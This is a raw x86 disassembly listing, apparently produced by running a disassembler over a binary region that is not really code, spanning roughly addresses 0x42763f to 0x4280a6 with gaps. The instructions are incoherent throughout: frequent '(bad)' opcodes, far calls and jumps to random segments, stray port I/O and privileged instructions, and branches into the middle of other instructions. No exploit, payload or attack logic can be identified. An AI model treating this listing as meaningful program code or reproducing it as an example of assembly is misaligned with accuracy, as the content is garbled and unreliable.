  42763f:	xchg   ebp,eax
  427640:	jo     0x427617
  427642:	push   ebp
  427643:	jns    0x427632
  427645:	call   0x1850:0x4fb7a583
  42764c:	pop    es
  42764d:	jmp    0x42769c
  42764f:	jbe    0x427676
  427651:	xor    edi,edi
  427653:	push   ss
  427654:	fcmovnbe st,st(3)
  427656:	add    al,0xbb
  427658:	in     al,dx
  427659:	jle    0x427650
  42765b:	and    BYTE PTR [esi-0x27a09578],ch
  427661:	sbb    esi,DWORD PTR [ebx]
  427663:	jnp    0x427689
  427665:	adc    bh,dl
  427667:	ins    BYTE PTR es:[edi],dx
  427668:	popa   
  427669:	in     al,0xe2
  42766b:	dec    ebx
  42766c:	push   es
  42766d:	loopne 0x4276ca
  42766f:	push   esi
  427670:	jno    0x42761b
  427672:	out    dx,eax
  427673:	int3   
  427674:	ds adc al,0xfb
  427677:	pop    ds
  427678:	call   0x370c:0x4a17ce91
  42767f:	lock test eax,0x6e3d1b3b
  427685:	pushf  
  427686:	int3   
  427687:	sbb    al,0x98
  427689:	push   0xffffffab
  42768b:	repz pop edi
  42768d:	xor    dh,ah
  42768f:	scas   eax,DWORD PTR es:[edi]
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fstp   DWORD PTR [eax]
  427701:	and    cl,BYTE PTR [edx+0x1a51c42]
  427707:	add    BYTE PTR [ecx+eax*1],al
  42770a:	add    BYTE PTR [eax],al
  42770c:	adc    BYTE PTR [ebx+0x30ebbc1e],0x8f
  427713:	or     dl,al
  427715:	(bad)  
  427716:	out    dx,eax
  427717:	inc    ebx
  427718:	mov    ebx,0x898c816f
  42771d:	xor    cl,BYTE PTR [ebx+0xe530ed3]
  427723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427724:	jg     0x4276d2
  427726:	ficomp DWORD PTR [eax-0x7eb14499]
  42772c:	sub    al,0x10
  42772e:	xchg   edx,eax
  42772f:	cmp    edx,DWORD PTR [edi+esi*4-0x7da8bde9]
  427736:	lods   eax,DWORD PTR ds:[esi]
  427737:	sbb    eax,0x81d8065
  42773c:	hlt    
  42773d:	sub    ah,dl
  42773f:	push   0x4f
  427741:	xchg   esi,eax
  427742:	add    edx,DWORD PTR [ebp-0x51c9dfde]
  427748:	fsub   DWORD PTR [ecx-0x5b]
  42774b:	xchg   edi,eax
  42774c:	lds    edi,FWORD PTR [ebp+0x51]
  42774f:	(bad)  
  427750:	pop    edx
  427751:	cld    
  427752:	fdiv   QWORD PTR [edi+0x76766684]
  427758:	std    
  427759:	lods   eax,DWORD PTR ds:[esi]
  42775a:	outs   dx,BYTE PTR ds:[esi]
  42775b:	inc    esi
  42775c:	sub    DWORD PTR [esp+eax*2-0x5b],ebx
  427760:	adc    BYTE PTR [ebx+0xc76521b],dl
  427766:	and    DWORD PTR [eax-0x49],0xffffff9d
  42776a:	sahf   
  42776b:	add    al,0xc
  42776d:	xor    bl,bl
  42776f:	ins    DWORD PTR es:[edi],dx
  427770:	mov    eax,ds:0xce41d7c
  427775:	pop    ds
  427776:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427777:	lock pop ecx
  427779:	add    ecx,esi
  42777b:	or     cl,BYTE PTR [edx+0x5f]
  42777e:	gs mov edx,0xe8840bc9
  427784:	lock in al,0x72
  427787:	les    ebx,FWORD PTR [ebx+eiz*1-0x40]
  42778b:	(bad)  [ebp+0x3f]
  42778e:	out    0x3e,eax
  427790:	lock inc ecx
  427792:	(bad)  
  427793:	cld    
  427794:	jns    0x4277d8
  427796:	sub    bh,BYTE PTR [edi-0x52f1b6b1]
  42779c:	sbb    esp,ecx
  42779e:	pop    ebp
  42779f:	add    DWORD PTR [edx],0xcd33de09
  4277a5:	aam    0x16
  4277a7:	cli    
  4277a8:	inc    esp
  4277a9:	scas   eax,DWORD PTR es:[edi]
  4277aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277ab:	adc    eax,edx
  4277ad:	ins    BYTE PTR es:[edi],dx
  4277ae:	les    ecx,FWORD PTR [ebx]
  4277b0:	inc    ebp
  4277b1:	fwait
  4277b2:	jmp    0x427800
  4277b4:	and    edx,DWORD PTR [edi-0x2e]
  4277b7:	pop    ebx
  4277b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277b9:	loop   0x427792
  4277bb:	sub    ebx,DWORD PTR [ebx-0x5d28ec5c]
  4277c1:	dec    eax
  4277c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277c3:	mov    dh,0x81
  4277c5:	arpl   WORD PTR gs:[edi+ecx*8-0x447609e0],bx
  4277cd:	das    
  4277ce:	ret    
  4277cf:	ror    BYTE PTR [ecx+eiz*4],cl
  4277d2:	stos   BYTE PTR es:[edi],al
  4277d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277d4:	sbb    ch,BYTE PTR [ebp+0x59890456]
  4277da:	or     DWORD PTR [ebx+esi*1],esp
  4277dd:	add    edx,eax
  4277df:	push   ds
  4277e0:	xchg   edx,eax
  4277e1:	or     eax,0xac4f288c
  4277e6:	and    al,0xa4
  4277e8:	sbb    DWORD PTR [ebp+ebx*1-0x4ea772c8],eax
  4277ef:	push   eax
  4277f0:	add    al,0x4a
  4277f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277f3:	out    dx,eax
  4277f4:	lock push ecx
  4277f6:	mov    bh,0x1f
  4277f8:	in     al,dx
  4277f9:	add    al,0xe6
  4277fb:	out    dx,eax
  4277fc:	xchg   esp,eax
  4277fd:	cmp    ch,BYTE PTR [ebp+0x78]
  427800:	mov    ds:0xf2819bbb,eax
  427805:	pop    edx
  427806:	fnsave [edi-0x715312fe]
  42780c:	int3   
  42780d:	pop    ebx
  42780e:	jg     0x427869
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	mov    ecx,0x20a97c59
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    al,0x1
  42788a:	add    BYTE PTR [eax],al
  42788c:	pop    esp
  42788d:	repnz out dx,al
  42788f:	and    eax,0x75fd7d19
  427894:	xchg   DWORD PTR [ebx],esp
  427896:	xchg   DWORD PTR [edi],edi
  427898:	push   0x25
  42789a:	out    0x33,al
  42789c:	jae    0x427863
  42789e:	mov    es,WORD PTR [edi+esi*2+0x4f182541]
  4278a5:	addr16 push ebx
  4278a7:	hlt    
  4278a8:	xchg   ecx,eax
  4278a9:	jg     0x4278c7
  4278ab:	mov    edi,esp
  4278ad:	mov    DWORD PTR [ecx],eax
  4278af:	jmp    0x42790b
  4278b1:	leave  
  4278b2:	jle    0x427837
  4278b4:	cwde   
  4278b5:	or     al,ch
  4278b7:	cld    
  4278b8:	ror    DWORD PTR [esi],1
  4278ba:	rep stos BYTE PTR es:[edi],al
  4278bc:	add    BYTE PTR ds:0x2afaa7e8,al
  4278c2:	sub    BYTE PTR [edx-0x48cfe5b6],dl
  4278c8:	and    DWORD PTR [esi],edx
  4278ca:	inc    eax
  4278cb:	cdq    
  4278cc:	int    0xcf
  4278ce:	call   0xeb3a:0xc87e6325
  4278d5:	and    BYTE PTR [ebx+edi*2-0x6a2010a5],dl
  4278dc:	pop    ebx
  4278de:	mov    ebx,edi
  4278e0:	push   ebp
  4278e1:	ffreep st(1)
  4278e3:	ret    
  4278e4:	xchg   esp,eax
  4278e5:	jo     0x427961
  4278e7:	outs   dx,DWORD PTR ds:[esi]
  4278e8:	sahf   
  4278e9:	(bad)  
  4278ea:	mov    eax,0x9754aee0
  4278ef:	mov    edi,0x2870d7f0
  4278f4:	xchg   edx,eax
  4278f5:	sub    DWORD PTR [edx-0x6a],ebp
  4278f8:	sbb    ah,BYTE PTR [ebp-0x10fcc854]
  4278fe:	cmp    al,0x19
  427900:	fisttp QWORD PTR [ecx+ecx*4-0x69]
  427904:	data16 jecxz 0x4278dd
  427907:	cmp    BYTE PTR [ecx+edx*8+0x51],al
  42790b:	pop    edx
  42790c:	inc    ebp
  42790d:	(bad)  
  42790e:	cmp    al,0x6a
  427910:	xchg   edi,eax
  427911:	fs mov edx,0x3000731c
  427917:	mov    ebp,0x791c9994
  42791c:	bound  ebp,QWORD PTR ds:[edx-0x15]
  427920:	outs   dx,BYTE PTR ds:[esi]
  427921:	inc    edi
  427922:	repnz dec edi
  427924:	mov    dh,BYTE PTR [ebp+0x6b3946ae]
  42792a:	lahf   
  42792b:	stos   BYTE PTR es:[edi],al
  42792c:	mov    esi,0xd4798996
  427931:	mov    esi,0xcdf4c11f
  427936:	cmp    cl,BYTE PTR [ecx+ebp*2]
  427939:	jb     0x427908
  42793b:	xchg   edx,eax
  42793c:	ret    0xf160
  42793f:	inc    edi
  427940:	mov    edi,0x9340a0dd
  427945:	jl     0x42791f
  427947:	aaa    
  427948:	mov    dh,0x58
  42794a:	mov    ds:0xa2a7c634,eax
  42794f:	mov    ecx,0x8eda4c5a
  427954:	push   ds
  427955:	dec    eax
  427956:	inc    esi
  427957:	(bad)  [edi+0x6180f36f]
  42795d:	jo     0x4279da
  42795f:	lods   al,BYTE PTR ds:[esi]
  427960:	out    0xa2,al
  427962:	mov    ch,0x25
  427964:	jns    0x4279d9
  427966:	das    
  427967:	mov    ecx,0xa6b68daa
  42796c:	scas   al,BYTE PTR es:[edi]
  42796d:	or     al,0x99
  42796f:	mov    bl,0xe9
  427971:	shl    ebx,0x71
  427974:	sub    eax,0x375ef91a
  427979:	adc    al,0x4e
  42797b:	int    0x6f
  42797d:	dec    esi
  42797e:	(bad)  
  42797f:	mov    ah,0x96
  427981:	aaa    
  427982:	shr    BYTE PTR [edx+0xe3ee511],0x9f
  427989:	and    al,dl
  42798b:	xchg   esi,eax
  42798c:	test   al,0xa
  42798e:	mov    BYTE PTR ds:0x0,cl
	...
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	cmp    DWORD PTR [esi+ecx*2+0x64],0x43
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	adc    cl,BYTE PTR ds:0xbd4e94d4
  427a12:	imul   esp,edi,0x7e
  427a15:	sbb    al,0x4e
  427a17:	jmp    DWORD PTR [ebx-0x7a163575]
  427a1d:	jp     0x4279a2
  427a1f:	out    0x73,eax
  427a21:	sub    al,0x28
  427a23:	add    al,0x34
  427a25:	cmp    al,0xfe
  427a27:	mov    esi,0xdecc8894
  427a2c:	test   al,0x5b
  427a2e:	xor    ecx,DWORD PTR [ebx-0x6f5a8be3]
  427a34:	cmp    cl,BYTE PTR [esi-0x6c26eddc]
  427a3a:	cld    
  427a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a3c:	or     ch,al
  427a3e:	jmp    0xc67d:0x5da4732
  427a45:	mov    dh,0x0
  427a47:	int    0xd
  427a49:	stos   DWORD PTR es:[edi],eax
  427a4a:	arpl   WORD PTR [ecx],si
  427a4c:	cli    
  427a4d:	sahf   
  427a4e:	mov    ss,ebx
  427a50:	cmp    al,0xbf
  427a52:	ins    BYTE PTR es:[edi],dx
  427a53:	mov    ?,WORD PTR [eax+esi*4]
  427a56:	push   ebp
  427a57:	mov    ah,0x4f
  427a59:	mov    DWORD PTR [ecx+eiz*8+0x5d62586b],ebx
  427a60:	or     DWORD PTR [esi+0x25c01d18],edi
  427a66:	ins    BYTE PTR es:[edi],dx
  427a67:	push   esp
  427a68:	xchg   BYTE PTR ds:0xd7d26c59,bh
  427a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a6f:	jecxz  0x427aaf
  427a71:	mov    bh,0x0
  427a73:	stos   BYTE PTR es:[edi],al
  427a74:	inc    edx
  427a75:	cmc    
  427a76:	and    al,0x6e
  427a78:	imul   edx,DWORD PTR [edi+0x2d],0xffffffe8
  427a7c:	outs   dx,DWORD PTR ds:[esi]
  427a7d:	pop    ecx
  427a7e:	lds    eax,FWORD PTR [edx]
  427a80:	not    edi
  427a82:	push   0xd50b6a7b
  427a87:	jl     0x427a6e
  427a89:	add    DWORD PTR [eax-0x4da2055a],ebx
  427a8f:	cmp    ebx,0x2
  427a92:	shl    esi,1
  427a94:	int    0x53
  427a96:	lds    ecx,FWORD PTR [ebx-0x706dcf9e]
  427a9c:	mov    eax,ebx
  427a9e:	je     0x427a21
  427aa0:	xchg   edi,eax
  427aa1:	seta   BYTE PTR [ebp+0x3ec4f2ee]
  427aa8:	ds cdq 
  427aaa:	mov    edx,0x21214afc
  427aaf:	das    
  427ab0:	mov    esi,0x9d43622d
  427ab5:	sti    
  427ab6:	jl     0x427a8d
  427ab8:	sub    eax,0x692ca3fb
  427abd:	(bad)  
  427abe:	stc    
  427abf:	push   edi
  427ac0:	jmp    0x427b25
  427ac2:	push   ebp
  427ac3:	adc    eax,DWORD PTR [ebx-0x701127ab]
  427ac9:	pop    edx
  427aca:	sbb    eax,DWORD PTR [eax-0x7c]
  427acd:	shl    BYTE PTR [ebx+ecx*2],0x2
  427ad1:	ja     0x427abe
  427ad3:	xor    BYTE PTR [ecx+0x7ffc65e8],ch
  427ad9:	fldz   
  427adb:	inc    edx
  427adc:	sbb    eax,0x9a78871b
  427ae1:	fld    QWORD PTR [ecx-0x29b34b0f]
  427ae7:	cmp    al,0xf6
  427ae9:	or     DWORD PTR [ebx+0x560bfc49],0x1b76f90e
  427af3:	cmc    
  427af4:	mov    ebx,0xd1a6e51e
  427af9:	and    dl,al
  427afb:	ja     0x427b4f
  427afd:	shl    DWORD PTR [esi],0x3c
  427b00:	fistp  DWORD PTR [ebx-0xa]
  427b03:	mov    DWORD PTR [ebp+0x2f46cf5f],edi
  427b09:	pop    ecx
  427b0a:	cld    
  427b0b:	xor    eax,0x4b573bb1
	...
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	idiv   BYTE PTR ds:0x28573c63
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	adc    DWORD PTR [eax+0x14],ecx
  427b8f:	pusha  
  427b90:	fucompp 
  427b92:	or     al,BYTE PTR [edx+edi*2-0x1b]
  427b96:	cmp    eax,0x3a390402
  427b9b:	mov    dh,0xb9
  427b9d:	fistp  QWORD PTR [ecx-0x6d98cfd2]
  427ba3:	nop
  427ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ba5:	inc    ebp
  427ba6:	test   BYTE PTR [ebx],cl
  427ba8:	sub    eax,0x25968b81
  427bad:	fs das 
  427baf:	hlt    
  427bb0:	out    dx,al
  427bb1:	outs   dx,DWORD PTR ds:[esi]
  427bb2:	popa   
  427bb3:	aam    0x1d
  427bb5:	lds    eax,FWORD PTR [ebx-0x35f0fbf]
  427bbb:	add    ebp,edi
  427bbd:	clc    
  427bbe:	dec    esp
  427bbf:	std    
  427bc0:	clc    
  427bc1:	add    eax,0x6f35332c
  427bc6:	inc    esp
  427bc7:	cli    
  427bc8:	push   edx
  427bc9:	daa    
  427bca:	add    DWORD PTR [edi+0x7711450e],eax
  427bd0:	fadd   st,st(4)
  427bd2:	daa    
  427bd3:	adc    DWORD PTR [ecx+0x6b],edx
  427bd6:	out    0x27,al
  427bd8:	dec    ebp
  427bd9:	mov    dh,BYTE PTR [ecx+0x72bd712f]
  427bdf:	fucomi st,st(7)
  427be1:	xchg   DWORD PTR [ebx-0x3a],ebp
  427be4:	or     bh,cl
  427be6:	add    eax,eax
  427be8:	(bad)  
  427bea:	sbb    DWORD PTR [ebp+0x2cc28a36],ecx
  427bf0:	mov    dh,0x4b
  427bf2:	jbe    0x427bc8
  427bf4:	lods   eax,DWORD PTR ds:[esi]
  427bf5:	push   es
  427bf6:	aam    0xb6
  427bf8:	and    al,0x80
  427bfa:	mov    ecx,DWORD PTR [esi-0x69]
  427bfd:	sar    BYTE PTR [eax+0x6c],cl
  427c00:	cmp    bl,0x30
  427c03:	dec    eax
  427c04:	xchg   ebx,eax
  427c05:	dec    eax
  427c06:	(bad)  
  427c07:	sar    BYTE PTR ds:0x52277ee3,cl
  427c0d:	add    eax,ecx
  427c0f:	and    al,0xa1
  427c11:	out    dx,al
  427c12:	jo     0x427c70
  427c14:	sbb    BYTE PTR [esi+edi*1+0x3a03445d],cl
  427c1b:	jmp    0xc172fb3b
  427c20:	adc    dh,dl
  427c22:	sub    ebp,ebp
  427c24:	cmp    BYTE PTR [ebp-0x2a],dh
  427c27:	fdiv   DWORD PTR [edi-0x3e]
  427c2a:	loop   0x427c3c
  427c2c:	jnp    0x427be7
  427c2e:	test   al,0xb6
  427c30:	and    al,0xf5
  427c32:	cmp    ch,bh
  427c34:	inc    ebx
  427c35:	outs   dx,BYTE PTR ds:[esi]
  427c36:	mov    DWORD PTR [ebx+0x5796a52b],esi
  427c3c:	mov    ds:0xbc0cc482,eax
  427c41:	jns    0x427bd7
  427c43:	pushf  
  427c44:	sbb    eax,0x8a7ff8e3
  427c49:	iret   
  427c4a:	pop    edi
  427c4b:	out    0x24,al
  427c4d:	mov    al,BYTE PTR [ebp-0x29]
  427c50:	xor    edx,0xf36aa317
  427c56:	jmp    0x427c9f
  427c58:	or     al,0x32
  427c5a:	nop
  427c5b:	repz icebp 
  427c5d:	mov    edi,0x3d8619b8
  427c62:	mov    esi,0x668fe662
  427c67:	pop    edx
  427c68:	mov    ch,0xff
  427c6a:	and    DWORD PTR [edx+edx*8+0x2b],esp
  427c6e:	sub    cl,BYTE PTR [ecx+0x6862bd11]
  427c74:	push   esp
  427c75:	xor    DWORD PTR [edi],eax
  427c77:	or     edx,ebx
  427c79:	pop    ds
  427c7a:	xchg   ebx,eax
  427c7b:	nop
  427c7c:	test   eax,0xaaddd983
  427c81:	ins    BYTE PTR es:[edi],dx
  427c82:	jno    0x427c46
  427c84:	and    ch,BYTE PTR [ecx+0x5ab865ae]
  427c8a:	dec    ebp
  427c8b:	into   
  427c8c:	(bad)  
  427c8d:	lds    edi,FWORD PTR [ecx+0x10]
	...
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x65ae5d44,ebx
  427d02:	jl     0x427cb3
  427d04:	sub    al,0xa9
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	ret    0x502f
  427d0f:	jbe    0x427d5f
  427d11:	das    
  427d12:	shr    DWORD PTR [ebp+0x7620cca2],cl
  427d18:	dec    eax
  427d19:	jle    0x427ce6
  427d1b:	or     ecx,edx
  427d1d:	jbe    0x427cf2
  427d1f:	mov    esp,DWORD PTR [ebx+0x20d301ee]
  427d25:	jmp    0xdc7c:0x3b866f1d
  427d2c:	aas    
  427d2d:	push   ebp
  427d2e:	sub    eax,0xa3ffc864
  427d33:	fmul   st(1),st
  427d35:	addr16 dec ecx
  427d37:	or     BYTE PTR [ebx+0x7af519e3],ah
  427d3d:	fmul   st,st(6)
  427d3f:	pop    esp
  427d40:	(bad)  
  427d42:	xchg   BYTE PTR [ebx+0x49224e75],ch
  427d48:	inc    edi
  427d49:	call   0xd285:0x9890ec35
  427d50:	daa    
  427d51:	ds sub ebx,ebx
  427d54:	test   eax,0x58f51178
  427d59:	inc    ebp
  427d5a:	and    bh,BYTE PTR ds:[edx-0x3e2c1bc3]
  427d61:	(bad)  
  427d62:	fwait
  427d63:	xchg   BYTE PTR [edi-0x24],cl
  427d66:	loopne 0x427dd3
  427d68:	xchg   ecx,eax
  427d69:	sub    DWORD PTR [edi+eiz*1-0x7a],0xb4cc5e63
  427d71:	adc    al,bl
  427d73:	push   edi
  427d74:	add    al,0xa5
  427d76:	add    esi,esi
  427d78:	into   
  427d79:	pop    ebx
  427d7a:	cmp    eax,DWORD PTR [ebx]
  427d7c:	or     eax,0x558fd611
  427d81:	sbb    DWORD PTR [eax],edi
  427d83:	jmp    DWORD PTR [ebp+0x1fc09acf]
  427d89:	retf   0x668b
  427d8c:	push   esp
  427d8d:	xchg   DWORD PTR [eax-0x6e9660fc],esp
  427d93:	cmp    eax,0x538cf16f
  427d98:	mov    ebp,DWORD PTR [eax]
  427d9a:	repnz mov edx,0xa1c058cc
  427da0:	test   BYTE PTR [edx],cl
  427da2:	mov    dh,0xb0
  427da4:	icebp  
  427da5:	test   BYTE PTR [eax],bh
  427da7:	cmp    ecx,DWORD PTR [esp+ebx*2-0x5eaefd80]
  427dae:	push   edi
  427daf:	xor    al,0x49
  427db1:	fsubr  QWORD PTR [esi]
  427db3:	lahf   
  427db4:	sub    edi,DWORD PTR [esi+0x228c86d]
  427dba:	inc    ebx
  427dbb:	scas   al,BYTE PTR es:[edi]
  427dbc:	jle    0x427e3a
  427dbe:	push   ds
  427dbf:	div    BYTE PTR ds:0xd157c8b8
  427dc5:	inc    edi
  427dc6:	shl    ecx,1
  427dc8:	call   0xfa72721b
  427dcd:	and    DWORD PTR [edx-0x24],0xffffffe1
  427dd1:	and    DWORD PTR [ecx-0x1d],ebp
  427dd4:	cmp    dl,ch
  427dd6:	leave  
  427dd7:	push   0x6f
  427dd9:	fucomp st(3)
  427ddb:	and    DWORD PTR [eax+0x499e8470],0x44026093
  427de5:	xor    BYTE PTR [ecx],bl
  427de7:	add    DWORD PTR [ebx+0x44],edx
  427dea:	push   ss
  427deb:	pop    ebx
  427dec:	jo     0x427e13
  427dee:	jns    0x427e55
  427df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427df1:	add    al,BYTE PTR [ebx-0x623f471c]
  427df7:	sbb    BYTE PTR [ebx],bl
  427df9:	aas    
  427dfa:	mov    bh,0x7d
  427dfc:	mov    eax,ds:0x2aabaf0b
  427e01:	inc    ecx
  427e02:	push   edx
  427e03:	daa    
  427e04:	mov    ch,0x66
  427e06:	loope  0x427e25
  427e08:	xchg   ebx,eax
  427e09:	push   cs
  427e0a:	(bad)  
  427e0b:	fld    st(6)
  427e0d:	xor    al,0xcd
  427e0f:	in     eax,0x0
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	push   ebx
  427e81:	cmp    eax,0xaa30b69f
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    al,0x1
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	std    
  427e8d:	dec    edi
  427e8e:	out    dx,al
  427e8f:	pop    edx
  427e90:	mov    ebp,0x62a6f2a3
  427e95:	test   eax,0x7c61ea33
  427e9a:	shr    BYTE PTR [ecx+0x5b5d25ff],0xf8
  427ea1:	inc    ebx
  427ea2:	fild   QWORD PTR [esi+0x61d71301]
  427ea8:	std    
  427ea9:	and    BYTE PTR [ebp-0x11],dl
  427eac:	jns    0x427ea3
  427eae:	aas    
  427eaf:	jp     0x427e33
  427eb1:	test   eax,0xbcb8863f
  427eb6:	jb     0x427ee6
  427eb8:	ret    0xa46f
  427ebb:	sbb    al,BYTE PTR [edi-0x7a]
  427ebe:	fnstenv [ebx-0x47212bd6]
  427ec4:	cmp    ch,BYTE PTR ds:0xd28d90e1
  427eca:	cmc    
  427ecb:	adc    BYTE PTR [edx+0x69],0xc0
  427ecf:	fimul  WORD PTR [edi-0x34de18f0]
  427ed5:	dec    eax
  427ed6:	cmp    esp,DWORD PTR [ebp+0x68]
  427ed9:	push   ds
  427eda:	adc    al,0x7a
  427edc:	clc    
  427edd:	and    ecx,DWORD PTR [ebx]
  427edf:	jecxz  0x427f40
  427ee1:	dec    esp
  427ee2:	push   edi
  427ee3:	pop    ebx
  427ee4:	call   0x87a1:0x681b8943
  427eeb:	inc    esp
  427eec:	ins    BYTE PTR es:[edi],dx
  427eed:	adc    dh,BYTE PTR ds:0xb3010df1
  427ef3:	pop    edi
  427ef4:	dec    eax
  427ef5:	(bad)  [edx]
  427ef7:	inc    ebp
  427ef8:	or     esp,DWORD PTR fs:[edi-0x4738fc1a]
  427eff:	loopne 0x427f69
  427f01:	pop    ebx
  427f02:	arpl   WORD PTR [ebx],di
  427f04:	sar    BYTE PTR [ecx-0x316fbe9],cl
  427f0a:	xchg   esi,ebx
  427f0c:	imul   eax,DWORD PTR [esi-0x17f84a3],0x5f
  427f13:	mov    DWORD PTR [esp+ebp*8-0x599eabab],esp
  427f1a:	jns    0x427eda
  427f1c:	xchg   esi,eax
  427f1d:	fcmove st,st(1)
  427f1f:	outs   dx,DWORD PTR ds:[esi]
  427f20:	ret    
  427f21:	enter  0xa3e3,0xdd
  427f25:	lods   eax,DWORD PTR ds:[esi]
  427f26:	mov    eax,ds:0x80c11ea1
  427f2b:	fist   WORD PTR [esi-0x4d]
  427f2e:	add    DWORD PTR [edx],ecx
  427f30:	or     edi,DWORD PTR [edi-0x12]
  427f33:	xlat   BYTE PTR ds:[ebx]
  427f34:	(bad)  
  427f35:	fmul   st(0),st
  427f37:	sti    
  427f38:	(bad)  
  427f39:	pop    eax
  427f3a:	test   BYTE PTR [ebp+eax*8-0x573fc250],ch
  427f41:	add    al,0xd0
  427f43:	outs   dx,DWORD PTR ds:[esi]
  427f44:	pop    esi
  427f45:	dec    ebp
  427f46:	test   al,0x6f
  427f48:	retf   0xcf9d
  427f4b:	aas    
  427f4c:	dec    ebx
  427f4d:	mov    edx,0x1d00f104
  427f52:	out    dx,al
  427f53:	out    0xde,eax
  427f55:	fadd   DWORD PTR [esi+ebx*8]
  427f58:	and    ecx,DWORD PTR [ebp+ecx*8-0xf]
  427f5c:	aam    0x1b
  427f5e:	push   edi
  427f5f:	mov    esp,0xb65c2756
  427f64:	jle    0x427f69
  427f66:	sbb    bl,BYTE PTR [edx]
  427f68:	mov    ds:0x3cee576c,al
  427f6d:	out    0x97,eax
  427f6f:	in     eax,0x77
  427f71:	jmp    0x427fab
  427f73:	scas   al,BYTE PTR es:[edi]
  427f74:	push   0xbfa8a8e
  427f79:	imul   edi,DWORD PTR [eax+0x1c],0xffffff82
  427f7d:	sbb    ecx,DWORD PTR [edi+0x64]
  427f80:	inc    edi
  427f81:	stos   BYTE PTR es:[edi],al
  427f82:	stos   BYTE PTR es:[edi],al
  427f83:	sub    ebx,DWORD PTR [eax-0x71]
  427f86:	or     eax,0x2e8e6ebb
  427f8b:	lahf   
  427f8c:	(bad)  
  427f8d:	stos   BYTE PTR es:[edi],al
  427f8e:	repnz pop ss
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	xor    eax,0x3405d7b7
  428005:	stos   DWORD PTR es:[edi],eax
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	xchg   ecx,eax
  42800d:	xchg   esp,eax
  42800e:	pop    esi
  42800f:	out    dx,eax
  428010:	js     0x428078
  428012:	or     BYTE PTR [ecx],al
  428014:	mov    ebp,0x73843b45
  428019:	fidiv  DWORD PTR [esi-0x76]
  42801c:	std    
  42801d:	repz jge 0x428074
  428020:	jmp    0xab09:0x93482d26
  428027:	in     eax,0x50
  428029:	idiv   BYTE PTR [edi]
  42802b:	popf   
  42802c:	jns    0x42806f
  42802e:	int    0xe5
  428030:	and    BYTE PTR [edi-0x1c],al
  428033:	jecxz  0x427fba
  428035:	mov    dl,0xb0
  428037:	test   eax,0xe431e506
  42803c:	push   ebx
  42803d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42803e:	xor    dh,BYTE PTR [ecx]
  428040:	or     dl,BYTE PTR [edi+0x18e27b57]
  428046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428047:	cmp    ch,al
  428049:	jmp    0x9e44:0x8bcac40d
  428050:	jno    0x42806f
  428052:	jno    0x428009
  428054:	aaa    
  428055:	cmp    DWORD PTR ds:0xd04fc40,0x399ce146
  42805f:	sti    
  428060:	mov    ah,BYTE PTR [edx+0x1f]
  428063:	iret   
  428064:	and    al,0x99
  428066:	test   eax,0xb2c0e686
  42806b:	or     al,BYTE PTR [esp+ecx*1]
  42806e:	sbb    bh,bh
  428070:	or     dh,BYTE PTR [ebp+0x67]
  428073:	inc    edi
  428074:	retf   
  428075:	es out 0x11,eax
  428078:	or     DWORD PTR [esi],esi
  42807a:	adc    al,0x13
  42807c:	sahf   
  42807d:	(bad)  
  42807e:	stos   BYTE PTR es:[edi],al
  42807f:	fcom   QWORD PTR [esi+0x72]
  428082:	ins    DWORD PTR es:[edi],dx
  428083:	cld    
  428084:	dec    edi
  428085:	adc    eax,0xc52e6e97
  42808a:	sbb    DWORD PTR [ebx],edx
  42808c:	and    BYTE PTR [ebp-0xb63e122],ch
  428092:	addr16 xchg edx,eax
  428094:	jno    0x428058
  428096:	sbb    eax,edi
  428098:	into   
  428099:	add    eax,DWORD PTR [edx+edi*1+0x53f0a97d]
  4280a0:	inc    esp
  4280a1:	mov    ecx,es
  4280a3:	sub    bh,dh
  4280a5:	lods   eax,DWORD PTR ds:[esi]
  4280a6:	sbb    BYTE PTR [edx+0xc],0x8a
